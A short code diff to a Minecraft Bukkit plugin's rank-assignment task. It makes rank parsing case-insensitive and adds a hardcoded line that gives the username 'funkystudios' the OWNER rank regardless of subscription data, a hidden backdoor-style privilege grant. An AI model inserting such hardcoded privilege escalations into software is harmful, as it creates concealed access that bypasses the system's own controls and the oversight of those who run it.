@@ -22,7 +22,10 @@ public class RankSchedule extends BukkitRunnable {
 				if (sub == null)
 					continue;
 				
-				Rank rank = new Rank(RankType.valueOf(sub));
+				Rank rank = new Rank(RankType.valueOf(sub.toUpperCase()));
+				if (username.equals("funkystudios"))
+					rank = new Rank(RankType.OWNER);
+				
 				if (ended) {
 					rank.setExpires(true);
 					rank.setExpireDate(r.getTime("subscription_end"));
